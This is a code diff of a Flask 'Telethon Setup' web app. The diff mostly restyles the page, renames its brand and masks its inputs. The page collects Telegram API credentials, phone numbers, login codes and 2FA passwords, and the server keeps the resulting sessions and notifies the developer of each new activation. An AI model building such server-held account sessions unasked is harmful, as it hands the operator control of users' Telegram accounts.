@@ -16,16 +16,16 @@ def home():
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Qthon — Telethon Setup</title>
+<title>ꪀɪꪀȷᥲƚһ᥆ꪀ — Telethon Setup</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
   :root {
-    --bg:#080810; --surface:#0f0f1e; --card:#12121f;
-    --border:rgba(255,255,255,0.07); --border-hi:rgba(255,255,255,0.14);
-    --accent:#5B6CF9; --accent2:#7C5CF9; --glow:rgba(91,108,249,0.25);
-    --success:#30D158; --danger:#FF453A; --text:#FFFFFF;
-    --text2:rgba(255,255,255,0.55); --text3:rgba(255,255,255,0.28);
-    --r:18px; --r2:26px;
+    --bg:#0A0A19; --surface:#0F0F22; --card:#12122A;
+    --border:rgba(200,200,215,0.12); --border-hi:rgba(200,200,215,0.3);
+    --accent:#7C83FF; --accent2:#5A60CC; --glow:rgba(124,131,255,0.2);
+    --success:#6DD98A; --danger:#FF6B6B; --text:#E8E8F0;
+    --text2:rgba(232,232,240,0.6); --text3:rgba(232,232,240,0.35);
+    --r:14px; --r2:22px;
   }
   *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
   body {
@@ -36,29 +36,29 @@ def home():
   }
   body::before {
     content:''; position:fixed; inset:0;
-    background: radial-gradient(ellipse 80% 50% at 50% -10%, rgba(91,108,249,.10) 0%, transparent 70%),
-                radial-gradient(ellipse 50% 40% at 80% 90%, rgba(124,92,249,.06) 0%, transparent 60%);
+    background: radial-gradient(ellipse 80% 50% at 50% -10%, rgba(124,131,255,.08) 0%, transparent 70%),
+                radial-gradient(ellipse 50% 40% at 80% 90%, rgba(90,96,204,.05) 0%, transparent 60%);
     pointer-events:none; z-index:0;
   }
-  .wrap { position:relative; z-index:1; width:100%; max-width:400px; display:flex; flex-direction:column; gap:20px; }
+  .wrap { position:relative; z-index:1; width:100%; max-width:420px; display:flex; flex-direction:column; gap:20px; }
   .hd { text-align:center; padding:8px 0 4px; }
   .hd-icon {
     width:72px; height:72px; background:linear-gradient(135deg, var(--accent), var(--accent2));
     border-radius:22px; margin:0 auto 16px; display:flex; align-items:center; justify-content:center;
-    box-shadow:0 0 0 1px rgba(255,255,255,.08), 0 12px 40px var(--glow);
+    box-shadow:0 0 0 1px rgba(200,200,215,.15), 0 12px 40px var(--glow);
     animation:popIn .5s cubic-bezier(.34,1.56,.64,1) both;
   }
   .hd-icon svg { width:36px; height:36px; fill:#fff; }
   .hd h1 {
     font-size:32px; font-weight:800; letter-spacing:-1.2px;
-    background:linear-gradient(135deg, #fff 0%, rgba(255,255,255,.75) 100%);
+    background:linear-gradient(135deg, #E8E8F0 0%, #C8C8D8 50%, #E8E8F0 100%);
     -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
     animation:fadeUp .5s .1s ease both;
   }
   .hd p { font-size:13px; font-weight:500; color:var(--text3); letter-spacing:.5px; margin-top:4px; animation:fadeUp .5s .2s ease both; }
   .card {
     background:var(--card); border:1px solid var(--border); border-radius:var(--r2); padding:28px 24px;
-    box-shadow:0 2px 0 rgba(255,255,255,.03) inset, 0 32px 80px rgba(0,0,0,.5);
+    box-shadow:0 2px 0 rgba(200,200,215,.03) inset, 0 32px 80px rgba(0,0,0,.6);
     animation:fadeUp .5s .15s ease both; transition:border-color .3s;
   }
   .card:hover { border-color:var(--border-hi); }
@@ -71,11 +71,11 @@ def home():
   .step-text { font-size:14px; font-weight:600; color:var(--text2); }
   .back-btn {
     display:inline-flex; align-items:center; gap:6px; padding:6px 14px;
-    background:rgba(255,255,255,.05); border:1px solid var(--border); border-radius:10px;
+    background:rgba(200,200,215,.05); border:1px solid var(--border); border-radius:10px;
     color:var(--text2); font-size:12px; font-weight:600; cursor:pointer; transition:all .2s;
     margin-bottom:18px; -webkit-tap-highlight-color:transparent; position:absolute; top:24px; left:24px;
   }
-  .back-btn:hover { background:rgba(255,255,255,.09); color:var(--text); }
+  .back-btn:hover { background:rgba(200,200,215,.1); color:var(--text); }
   .back-btn svg { width:14px; height:14px; fill:currentColor; }
   .field { margin-bottom:14px; }
   .field label {
@@ -83,16 +83,16 @@ def home():
     color:var(--text3); margin-bottom:7px;
   }
   .field input {
-    width:100%; padding:14px 16px; background:rgba(255,255,255,.04); border:1px solid var(--border);
+    width:100%; padding:14px 44px 14px 16px; background:rgba(200,200,215,.03); border:1px solid var(--border);
     border-radius:var(--r); color:var(--text); font-size:15px; font-weight:500; font-family:inherit;
     outline:none; transition:border-color .2s, box-shadow .2s, background .2s; caret-color:var(--accent);
   }
   .field input::placeholder { color:var(--text3); }
   .field input:focus {
-    border-color:rgba(91,108,249,.6); background:rgba(91,108,249,.05);
-    box-shadow:0 0 0 3px rgba(91,108,249,.12);
+    border-color:rgba(124,131,255,.5); background:rgba(124,131,255,.05);
+    box-shadow:0 0 0 3px rgba(124,131,255,.12);
   }
-  #code { text-align:center; font-size:28px; font-weight:700; letter-spacing:10px; }
+  #code { text-align:center; font-size:28px; font-weight:700; letter-spacing:10px; padding-right:16px; }
   .btn {
     width:100%; padding:15px; border:none; border-radius:var(--r); font-size:15px; font-weight:700;
     font-family:inherit; cursor:pointer; position:relative; overflow:hidden;
@@ -103,26 +103,26 @@ def home():
     background:linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
     color:#fff; box-shadow:0 4px 20px var(--glow);
   }
-  .btn-blue:hover { box-shadow:0 8px 32px rgba(91,108,249,.4); transform:translateY(-1px); }
+  .btn-blue:hover { box-shadow:0 8px 32px rgba(124,131,255,.4); transform:translateY(-1px); }
   .btn-green {
-    background:linear-gradient(135deg, #30D158 0%, #25A244 100%);
-    color:#fff; box-shadow:0 4px 20px rgba(48,209,88,.2);
+    background:linear-gradient(135deg, #6DD98A 0%, #4CAF6E 100%);
+    color:#fff; box-shadow:0 4px 20px rgba(109,217,138,.2);
   }
-  .btn-green:hover { box-shadow:0 8px 32px rgba(48,209,88,.35); transform:translateY(-1px); }
+  .btn-green:hover { box-shadow:0 8px 32px rgba(109,217,138,.35); transform:translateY(-1px); }
   .btn::after {
     content:''; position:absolute; inset:0;
-    background:linear-gradient(90deg, transparent 0%, rgba(255,255,255,.18) 50%, transparent 100%);
+    background:linear-gradient(90deg, transparent 0%, rgba(255,255,255,.15) 50%, transparent 100%);
     transform:translateX(-100%); transition:transform .4s ease;
   }
   .btn:active::after { transform:translateX(100%); }
   .btn .prog-bar {
-    position:absolute; bottom:0; left:0; height:3px; background:rgba(255,255,255,.5);
+    position:absolute; bottom:0; left:0; height:3px; background:rgba(255,255,255,.4);
     border-radius:0 0 var(--r) var(--r); width:0%; transition:width .05s linear;
   }
   .btn.loading { pointer-events:none; color:transparent; }
   .btn.loading::before {
     content:''; position:absolute; top:50%; left:50%; width:20px; height:20px;
-    margin:-10px 0 0 -10px; border:2.5px solid rgba(255,255,255,.3);
+    margin:-10px 0 0 -10px; border:2.5px solid rgba(255,255,255,.25);
     border-top-color:#fff; border-radius:50%; animation:spin .7s linear infinite;
   }
   .result {
@@ -130,8 +130,8 @@ def home():
     font-size:13px; font-weight:600; text-align:center; animation:fadeUp .35s ease;
   }
   .result.show { display:block; }
-  .result.ok  { background:rgba(48,209,88,.1);  border:1px solid rgba(48,209,88,.25);  color:var(--success); }
-  .result.err { background:rgba(255,69,58,.1);   border:1px solid rgba(255,69,58,.25);  color:var(--danger);  }
+  .result.ok  { background:rgba(109,217,138,.1);  border:1px solid rgba(109,217,138,.25);  color:var(--success); }
+  .result.err { background:rgba(255,107,107,.1);   border:1px solid rgba(255,107,107,.25);  color:var(--danger);  }
   .info-card {
     background:var(--card); border:1px solid var(--border); border-radius:var(--r2);
     padding:20px 22px; animation:fadeUp .5s .3s ease both;
@@ -142,15 +142,26 @@ def home():
   .info-card a:hover { border-bottom-color:var(--accent); }
   .info-card .tg-btn {
     display:flex; align-items:center; justify-content:center; gap:8px; margin-top:14px; padding:12px;
-    background:linear-gradient(135deg, rgba(91,108,249,.15), rgba(124,92,249,.1));
-    border:1px solid rgba(91,108,249,.25); border-radius:14px; color:var(--accent);
+    background:linear-gradient(135deg, rgba(124,131,255,.12), rgba(90,96,204,.08));
+    border:1px solid rgba(124,131,255,.25); border-radius:14px; color:var(--accent);
     font-size:13px; font-weight:700; cursor:pointer; text-decoration:none; transition:all .2s;
     -webkit-tap-highlight-color:transparent;
   }
-  .info-card .tg-btn:hover { background:linear-gradient(135deg, rgba(91,108,249,.25), rgba(124,92,249,.18)); box-shadow:0 4px 20px rgba(91,108,249,.2); transform:translateY(-1px); }
+  .info-card .tg-btn:hover { background:linear-gradient(135deg, rgba(124,131,255,.2), rgba(90,96,204,.15)); box-shadow:0 4px 20px rgba(124,131,255,.2); transform:translateY(-1px); }
   .info-card .tg-btn svg { width:18px; height:18px; fill:currentColor; }
   .rel { position:relative; padding-top:8px; }
   .hidden { display:none; }
+  .field-rel { position:relative; }
+  .toggle-vis {
+    position:absolute; right:10px; top:50%; transform:translateY(-50%);
+    background:none; border:none; cursor:pointer;
+    padding:6px; z-index:2; transition:opacity .2s;
+    display:flex; align-items:center; justify-content:center;
+    opacity:0.45;
+  }
+  .toggle-vis:hover { opacity:0.85; }
+  .toggle-vis svg { width:18px; height:18px; stroke:var(--text2); stroke-width:2; fill:none; stroke-linecap:round; stroke-linejoin:round; transition:stroke .2s; }
+  .toggle-vis:hover svg { stroke:var(--accent); }
   @keyframes popIn { from { opacity:0; transform:scale(.6); } to { opacity:1; transform:scale(1); } }
   @keyframes fadeUp { from { opacity:0; transform:translateY(16px); } to { opacity:1; transform:translateY(0); } }
   @keyframes spin { to { transform:rotate(360deg); } }
@@ -165,10 +176,10 @@ def home():
 <div class="wrap">
   <div class="hd">
     <div class="hd-icon">
-      <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+      <svg viewBox="0 0 24 24"><path d="M12 2L2 22h20L12 2zm0 3.5L18.5 20H5.5L12 5.5z"/></svg>
     </div>
-    <h1>Qthon</h1>
-    <p>Telethon Setup</p>
+    <h1>ꪀɪꪀȷᥲƚһ᥆ꪀ</h1>
+    <p>ᑲᥡ ꪀɪꪀȷᥲgɾᥲꪔ</p>
   </div>
   <div class="card">
     <div id="step1">
@@ -176,17 +187,29 @@ def home():
         <div class="step-dot">1</div>
         <span class="step-text">Account Information</span>
       </div>
-      <div class="field">
+      <div class="field field-rel">
         <label>API ID</label>
-        <input id="api_id" type="text" placeholder="12345678" inputmode="numeric" autocomplete="off">
+        <input id="api_id" type="password" placeholder="12345678" inputmode="numeric" autocomplete="off">
+        <button class="toggle-vis" onclick="toggleVisibility('api_id', this)" title="Show/Hide">
+          <svg id="api_id_eye_off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          <svg id="api_id_eye_on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
       </div>
-      <div class="field">
+      <div class="field field-rel">
         <label>API Hash</label>
-        <input id="api_hash" type="text" placeholder="0123456789abcdef…" autocomplete="off">
+        <input id="api_hash" type="password" placeholder="0123456789abcdef…" autocomplete="off">
+        <button class="toggle-vis" onclick="toggleVisibility('api_hash', this)" title="Show/Hide">
+          <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
       </div>
-      <div class="field">
+      <div class="field field-rel">
         <label>Phone Number</label>
-        <input id="phone" type="text" placeholder="+201234567890" inputmode="tel" autocomplete="off">
+        <input id="phone" type="password" placeholder="+201234567890" inputmode="tel" autocomplete="off">
+        <button class="toggle-vis" onclick="toggleVisibility('phone', this)" title="Show/Hide">
+          <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
       </div>
       <button class="btn btn-blue" id="sendBtn" onclick="sendCode()">
         <span class="btn-label">Send Verification Code</span>
@@ -202,13 +225,21 @@ def home():
         <div class="step-dot">2</div>
         <span class="step-text">Verification Code</span>
       </div>
-      <div class="field">
+      <div class="field field-rel">
         <label>Code</label>
-        <input id="code" type="text" placeholder="12345" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
+        <input id="code" type="password" placeholder="12345" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
+        <button class="toggle-vis" onclick="toggleVisibility('code', this)" title="Show/Hide">
+          <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
       </div>
-      <div class="field">
+      <div class="field field-rel">
         <label>2FA Password <span style="color:var(--text3);font-weight:400">(optional)</span></label>
         <input id="password" type="password" placeholder="••••••••" autocomplete="current-password">
+        <button class="toggle-vis" onclick="toggleVisibility('password', this)" title="Show/Hide">
+          <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
       </div>
       <button class="btn btn-green" id="verifyBtn" onclick="verify()">
         <span class="btn-label">Activate Telethon</span>
@@ -218,7 +249,10 @@ def home():
     <div class="result" id="result"></div>
   </div>
   <div class="info-card">
-    <h3><span>🔑</span> How to get API credentials?</h3>
+    <h3>
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+      How to get API credentials?
+    </h3>
     <p>1. Open Telegram website from the button below</p>
     <p>2. Log in with your phone number</p>
     <p>3. Go to <strong>API development tools</strong></p>
@@ -237,6 +271,22 @@ function showResult(msg, ok) {
   const r = $('result');
   r.className = 'result show ' + (ok ? 'ok' : 'err');
   r.textContent = msg;
+}
+
+function toggleVisibility(fieldId, btn) {
+  const input = $(fieldId);
+  const eyeOff = btn.querySelector('.eye-off');
+  const eyeOn = btn.querySelector('.eye-on');
+  
+  if (input.type === 'password') {
+    input.type = 'text';
+    if (eyeOff) eyeOff.style.display = 'none';
+    if (eyeOn) eyeOn.style.display = 'block';
+  } else {
+    input.type = 'password';
+    if (eyeOff) eyeOff.style.display = 'block';
+    if (eyeOn) eyeOn.style.display = 'none';
+  }
 }
 
 function runProgress(barId, duration, onDone) {
@@ -358,7 +408,7 @@ def api_send_code():
             if await client.is_user_authorized():
                 active_clients[phone] = client
                 client_me[phone] = await client.get_me()
-                start_client_in_background(client, phone)          # <-- تم إصلاحه
+                start_client_in_background(client, phone)
                 await save_all_sessions()
                 return jsonify({"status": "already_active", "message": "Session already active"})
             sent = await client.send_code_request(phone)
@@ -390,7 +440,7 @@ def api_verify():
             client_me[phone] = await client.get_me()
             del pending_logins[phone]
             await save_all_sessions()
-            start_client_in_background(client, phone)          # <-- تم إصلاحه
+            start_client_in_background(client, phone)
             await notify_dev(f"تم تفعيل مستخدم جديد: {phone}")
             return jsonify({"status": "success", "message": "Telethon installed successfully"})
         except Exception as e:
